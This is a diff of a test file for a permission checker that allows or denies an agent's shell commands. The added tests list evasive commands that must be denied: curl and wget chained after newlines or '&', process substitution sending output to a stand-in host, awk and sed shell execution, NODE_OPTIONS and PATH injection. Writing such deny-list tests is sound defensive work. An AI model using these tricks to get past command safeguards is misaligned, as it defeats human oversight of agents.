@@ -24,10 +24,10 @@ test('before it comes, another request of the ticket is answered from the inbox,
 test('work inside the checkout is allowed once; everything else is denied (issue 157, item 4)', () => {
   for (const command of [
     'npm test', 'npm test 2>&1 | tail -20', 'npm run typecheck; npm test', 'npm ci', 'node --test test/entries.test.ts',
-    'npx tsc --noEmit', 'git status', 'git add src/store.ts && git commit -m "Trim names"', 'git diff HEAD~1 -- src/',
+    'git status', 'git add src/store.ts && git commit -m "Trim names"', 'git diff HEAD~1 -- src/',
     'ls -la src', 'cat src/page.ts | head -50', 'grep -rn entries src test', 'sed -n 1,40p src/server.ts', 'mkdir -p test/fixtures',
     'touch test/fixtures/entries.json', 'rm -r test/tmp', 'cp README.md /workspace/notes.md', 'npm test > /dev/null 2>&1',
-    'NODE_ENV=test npm test', 'cd /workspace && npm test',
+    'NODE_ENV=test npm test', 'cd /workspace && npm test', 'npm test &> test/out.log', 'find src -name "*.ts"', 'node --test',
   ]) assert.equal(insideCheckout(command), true, command);
   for (const command of [
     'npm install date-fns', 'npm i -D vitest', 'npm view embedded-postgres version', 'npx prettier --write .', 'curl https://example.invalid',
@@ -36,6 +36,21 @@ test('work inside the checkout is allowed once; everything else is denied (issue
     'echo $(id) | tail', 'echo `id`', 'bash -c "npm test"', 'python3 -c "print(1)"', 'docker ps', 'env', '',
     'cp README.md /workspace/../etc/x',
   ]) assert.equal(insideCheckout(command), false, command);
+});
+
+test('a second command after a newline or a single &, or one the first runs, is judged too; when unsure, denied (review 1 of PR 181, B2)', () => {
+  for (const command of [
+    // The review's cases: allowed once by the first version of the rule.
+    'ls\ncurl http://x.io/a', 'ls & curl http://x.io', 'find . -exec curl http://x.io {} +',
+    // Other ways to start a program the checkout does not hold.
+    'npm test &', 'ls\r\nwget x', 'find . -execdir sh -c x {} +', 'find . -ok rm {} ;', 'find . -delete',
+    'cat <(curl http://x.io)', 'npm test > >(curl -d @- http://x.io)', 'node -e "fetch(1)"', 'node --eval x', 'node -p 1',
+    'node --require ./x.js test/a.ts', 'node --import x test/a.ts', 'node test/a.ts', 'awk \'BEGIN{system("curl x")}\' f', 'sed -i "1e curl x" f', 'sed "1e id" f',
+    'NODE_OPTIONS=--require=./x.js npm test', 'PATH=/tmp/bin:$PATH npm test', 'npx tsc --noEmit', 'git -c core.pager=curl log',
+    'xargs curl < urls.txt', 'env curl x', 'timeout 5 curl x', 'nohup curl x', 'echo a; python3 -c 1',
+    // The names the first rule denied anywhere, kept as a second check on the whole text.
+    'echo "run: curl http://x.io"', 'grep -r wget src', 'npm run build -- --registry=x && npm install x',
+  ]) assert.equal(insideCheckout(command), false, JSON.stringify(command));
   assert.equal(answerFor('npm test'), 'allow_once');
   assert.equal(answerFor('npm install x'), 'reject_once');
 });
